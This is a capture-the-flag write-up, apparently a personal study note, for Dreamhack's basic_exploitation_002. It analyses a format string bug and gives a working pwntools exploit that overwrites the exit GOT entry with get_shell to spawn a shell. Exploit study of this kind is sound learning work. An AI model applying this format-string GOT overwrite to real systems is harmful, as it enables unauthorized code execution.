# basic_exploitation_002 - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 2
- Provided Files: basic_exploitation_002.c, basic_exploitation_002(ELF)
- tools:
## Brief Description
## Initial Analysis
### Environment
``` sh
checksec basic_exploitation_002
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
### Code
``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    read(0, buf, 0x80);
    printf(buf);

    exit(0);
}
```
## Vulnerability
### FSB(Format String Bug)
``` c
read(0, buf, 0x80); // buf size: 0x80
printf(buf);
```
`buf`에 담긴 사용자 입력을 검증/필터링 없이 `printf`로 출력한다.  
## Exploit
### Strategy
PIE가 비활성화 되어있으므로, `get_shell`의 주소는 고정된다. FSB를 이용해서 `exit`의 got를 `get_shell`로 덮어쓰면 쉘을 획득할 수 있다.  
### Exploitation Steps
``` sh
$ ./basic_exploitation_002
AAAA AAAA %x %x %x %x %x %x %x %x %x %x
AAAA AAAA 41414141 41414120 78252041 20782520 25207825 78252078 20782520 25207825 78252078 a782520
```
예상대로, 인자는 [FSP] 부터 + 0x4씩 증가하는 것을 확인할 수 있다.
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
| ra | 0x4 |
| ebp |  |
| buf | 0x80 |
### payload
``` python
from pwn import *

p = remote('host8.dreamhack.games', 13780)
context.arch = "i386"

e = ELF('./basic_exploitation_002')
# libc = ELF('x64/libc-2.23.so')

# payload
exit_got = e.got["exit"]
get_shell = e.symbols["get_shell"]
get_shell = p32(get_shell)
original = p32(0x8048476)

under = get_shell[:2] # 하위 2바이트만 덮어 씀. 상위 2바이트는 동일함
under = int.from_bytes(under, "little")

payload = f"%{under}c".encode()
payload += b"%5$hn"
to_add = 16 - len(payload)
payload += b"A" * to_add # 16byte로 맞추기 위한 padding
payload += p32(exit_got)

p.send(payload)

# interactive
p.interactive()
```
